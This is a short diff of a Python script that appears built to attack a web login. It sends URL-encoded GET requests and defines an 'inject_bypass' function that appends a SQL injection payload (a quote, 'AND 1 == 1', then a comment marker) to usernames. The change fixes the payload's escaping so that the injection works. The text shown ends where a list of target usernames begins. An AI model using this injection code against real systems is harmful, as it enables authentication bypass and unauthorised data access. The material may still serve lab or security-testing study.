@@ -3,7 +3,6 @@
 import urllib.parse as urlp
 import urllib.request as urlr
 
-
 def send_request(params, url):
     query = urlp.urlencode(params)
     url = url + "?" + query
@@ -13,7 +12,7 @@ def send_request(params, url):
 
 
 def inject_bypass(user):
-    return user + "\\" AND 1 == 1 --"
+    return user + "\" AND 1 == 1 --"
 
 
 usernames = {
